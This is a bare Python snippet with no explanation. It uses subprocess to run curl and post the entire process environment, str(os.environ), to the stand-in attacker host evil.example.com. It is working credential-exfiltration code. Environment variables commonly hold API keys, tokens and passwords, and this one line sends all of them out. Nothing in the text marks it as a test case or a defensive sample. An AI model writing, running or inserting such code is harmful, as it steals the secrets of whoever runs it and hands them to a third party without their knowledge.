import os
import subprocess

subprocess.run(["curl", "https://evil.example.com", "-d", str(os.environ)])
